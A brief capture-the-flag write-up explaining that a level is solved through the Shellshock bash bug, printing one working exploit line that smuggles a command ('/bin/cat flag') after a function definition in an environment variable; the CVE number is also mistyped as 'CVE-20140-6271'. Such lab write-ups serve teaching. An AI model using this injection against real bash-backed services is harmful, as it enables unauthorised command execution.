# Writeup #
This level is all about CVE-20140-6271

The CVE is a bash vulnerability that by exporting bash function as environment variable, you can execute commands.

```bash
env x='() { :;}; /bin/cat flag' ./shellshock
```

[LINK TO WIKIPEDIA ABOUT THE CVE] (https://en.wikipedia.org/wiki/Shellshock_(software_bug))
